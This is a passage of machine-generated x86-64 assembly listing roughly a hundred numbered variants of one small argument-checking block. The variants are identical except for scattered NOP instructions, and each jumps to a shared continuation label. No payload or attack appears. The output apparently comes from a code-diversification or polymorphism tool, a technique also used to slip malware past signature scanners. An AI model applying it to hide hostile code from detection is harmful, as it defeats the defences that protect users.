	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 36
.Lmain_win4_var36:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	nop
	nop
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	nop
	jmp	.Lmain_win4_continue
## Variant 37
.Lmain_win4_var37:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	nop
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 38
.Lmain_win4_var38:
	popq	%rax
	nop
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 39
.Lmain_win4_var39:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	nop
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 40
.Lmain_win4_var40:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	nop
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 41
.Lmain_win4_var41:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	nop
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	nop
	jmp	.Lmain_win4_continue
## Variant 42
.Lmain_win4_var42:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	nop
	leaq	-48(%rbp), %rdx
	nop
	jmp	.Lmain_win4_continue
## Variant 43
.Lmain_win4_var43:
	popq	%rax
	cmpl	$4, -24(%rbp)
	nop
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	nop
	leaq	-48(%rbp), %rdx
	nop
	jmp	.Lmain_win4_continue
## Variant 44
.Lmain_win4_var44:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	nop
	nop
	nop
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 45
.Lmain_win4_var45:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	nop
	nop
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 46
.Lmain_win4_var46:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
	nop
## %bb.7:
	nop
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	nop
	jmp	.Lmain_win4_continue
## Variant 47
.Lmain_win4_var47:
	popq	%rax
	nop
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 48
.Lmain_win4_var48:
	popq	%rax
	cmpl	$4, -24(%rbp)
	nop
	nop
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	nop
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 49
.Lmain_win4_var49:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	nop
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 50
.Lmain_win4_var50:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	nop
	jmp	.Lmain_win4_continue
## Variant 51
.Lmain_win4_var51:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
	nop
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	nop
	jmp	.Lmain_win4_continue
## Variant 52
.Lmain_win4_var52:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	nop
	jmp	.Lmain_win4_continue
## Variant 53
.Lmain_win4_var53:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	nop
	nop
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	nop
	jmp	.Lmain_win4_continue
## Variant 54
.Lmain_win4_var54:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	nop
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 55
.Lmain_win4_var55:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
	nop
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 56
.Lmain_win4_var56:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	nop
	jmp	.Lmain_win4_continue
## Variant 57
.Lmain_win4_var57:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	nop
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 58
.Lmain_win4_var58:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	nop
	nop
	movq	-32(%rbp), %rax
	nop
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 59
.Lmain_win4_var59:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	nop
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 60
.Lmain_win4_var60:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	nop
	nop
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	nop
	jmp	.Lmain_win4_continue
## Variant 61
.Lmain_win4_var61:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	nop
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 62
.Lmain_win4_var62:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	nop
	leaq	-48(%rbp), %rdx
	nop
	jmp	.Lmain_win4_continue
## Variant 63
.Lmain_win4_var63:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	nop
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 64
.Lmain_win4_var64:
	popq	%rax
	nop
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 65
.Lmain_win4_var65:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	nop
	jmp	.Lmain_win4_continue
## Variant 66
.Lmain_win4_var66:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	nop
	nop
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 67
.Lmain_win4_var67:
	popq	%rax
	nop
	nop
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	nop
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 68
.Lmain_win4_var68:
	popq	%rax
	nop
	nop
	cmpl	$4, -24(%rbp)
	nop
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 69
.Lmain_win4_var69:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	nop
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 70
.Lmain_win4_var70:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
	nop
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 71
.Lmain_win4_var71:
	popq	%rax
	cmpl	$4, -24(%rbp)
	nop
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	nop
	leaq	L_.str.2(%rip), %rsi
	nop
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 72
.Lmain_win4_var72:
	popq	%rax
	cmpl	$4, -24(%rbp)
	nop
	jl	LBB2_8
	nop
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	nop
	jmp	.Lmain_win4_continue
## Variant 73
.Lmain_win4_var73:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
	nop
	nop
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 74
.Lmain_win4_var74:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
	nop
## %bb.7:
	movq	-32(%rbp), %rax
	nop
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 75
.Lmain_win4_var75:
	popq	%rax
	nop
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	nop
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 76
.Lmain_win4_var76:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	nop
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 77
.Lmain_win4_var77:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	nop
	movq	-32(%rbp), %rax
	nop
	movq	16(%rax), %rdi
	nop
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 78
.Lmain_win4_var78:
	popq	%rax
	cmpl	$4, -24(%rbp)
	nop
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 79
.Lmain_win4_var79:
	popq	%rax
	nop
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 80
.Lmain_win4_var80:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	nop
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	nop
	nop
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 81
.Lmain_win4_var81:
	popq	%rax
	cmpl	$4, -24(%rbp)
	nop
	nop
	jl	LBB2_8
## %bb.7:
	nop
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 82
.Lmain_win4_var82:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
	nop
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 83
.Lmain_win4_var83:
	popq	%rax
	cmpl	$4, -24(%rbp)
	nop
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	nop
	nop
	jmp	.Lmain_win4_continue
## Variant 84
.Lmain_win4_var84:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
	nop
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 85
.Lmain_win4_var85:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	nop
	movq	-32(%rbp), %rax
	nop
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	nop
	jmp	.Lmain_win4_continue
## Variant 86
.Lmain_win4_var86:
	popq	%rax
	nop
	nop
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	nop
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 87
.Lmain_win4_var87:
	popq	%rax
	cmpl	$4, -24(%rbp)
	nop
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 88
.Lmain_win4_var88:
	popq	%rax
	nop
	cmpl	$4, -24(%rbp)
	nop
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 89
.Lmain_win4_var89:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
	nop
	nop
## %bb.7:
	movq	-32(%rbp), %rax
	nop
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 90
.Lmain_win4_var90:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
	nop
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 91
.Lmain_win4_var91:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
	nop
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 92
.Lmain_win4_var92:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
	nop
## %bb.7:
	nop
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 93
.Lmain_win4_var93:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	nop
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 94
.Lmain_win4_var94:
	popq	%rax
	nop
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 95
.Lmain_win4_var95:
	popq	%rax
	cmpl	$4, -24(%rbp)
	nop
	jl	LBB2_8
## %bb.7:
	nop
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 96
.Lmain_win4_var96:
	popq	%rax
	cmpl	$4, -24(%rbp)
	nop
	jl	LBB2_8
	nop
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	nop
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 97
.Lmain_win4_var97:
	popq	%rax
	nop
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 98
.Lmain_win4_var98:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
	nop
	nop
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	nop
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 99
.Lmain_win4_var99:
	popq	%rax
	nop
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	nop
	nop
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 100
.Lmain_win4_var100:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	nop
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 101
.Lmain_win4_var101:
	popq	%rax
	cmpl	$4, -24(%rbp)
	nop
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 102
.Lmain_win4_var102:
	popq	%rax
	nop
	nop
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	nop
	jmp	.Lmain_win4_continue
## Variant 103
.Lmain_win4_var103:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	nop
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 104
.Lmain_win4_var104:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
	nop
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	nop
	jmp	.Lmain_win4_continue
## Variant 105
.Lmain_win4_var105:
	popq	%rax
	nop
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	nop
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	nop
	jmp	.Lmain_win4_continue
## Variant 106
.Lmain_win4_var106:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	nop
	nop
	nop
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 107
.Lmain_win4_var107:
	popq	%rax
	cmpl	$4, -24(%rbp)
	nop
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	nop
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	nop
	jmp	.Lmain_win4_continue
## Variant 108
.Lmain_win4_var108:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	nop
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 109
.Lmain_win4_var109:
	popq	%rax
	cmpl	$4, -24(%rbp)
	nop
	jl	LBB2_8
	nop
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 110
.Lmain_win4_var110:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	nop
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	nop
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 111
.Lmain_win4_var111:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	nop
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	nop
	nop
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 112
.Lmain_win4_var112:
	popq	%rax
	cmpl	$4, -24(%rbp)
	nop
	nop
	jl	LBB2_8
	nop
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 113
.Lmain_win4_var113:
	popq	%rax
	nop
	nop
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	nop
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 114
.Lmain_win4_var114:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	nop
	nop
	nop
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 115
.Lmain_win4_var115:
	popq	%rax
	nop
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
	nop
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	nop
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 116
.Lmain_win4_var116:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	nop
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 117
.Lmain_win4_var117:
	popq	%rax
	cmpl	$4, -24(%rbp)
	nop
	jl	LBB2_8
	nop
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	nop
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 118
.Lmain_win4_var118:
	popq	%rax
	nop
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 119
.Lmain_win4_var119:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	nop
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	nop
	jmp	.Lmain_win4_continue
## Variant 120
.Lmain_win4_var120:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	nop
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 121
.Lmain_win4_var121:
	popq	%rax
	cmpl	$4, -24(%rbp)
	nop
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 122
.Lmain_win4_var122:
	popq	%rax
	cmpl	$4, -24(%rbp)
	nop
	jl	LBB2_8
	nop
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 123
.Lmain_win4_var123:
	popq	%rax
	nop
	cmpl	$4, -24(%rbp)
	nop
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 124
.Lmain_win4_var124:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
	nop
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	nop
	nop
	jmp	.Lmain_win4_continue
## Variant 125
.Lmain_win4_var125:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
	nop
## %bb.7:
	movq	-32(%rbp), %rax
	nop
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 126
.Lmain_win4_var126:
	popq	%rax
	cmpl	$4, -24(%rbp)
	nop
	jl	LBB2_8
## %bb.7:
	nop
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 127
.Lmain_win4_var127:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
	nop
## %bb.7:
	movq	-32(%rbp), %rax
	nop
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 128
.Lmain_win4_var128:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	nop
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 129
.Lmain_win4_var129:
	popq	%rax
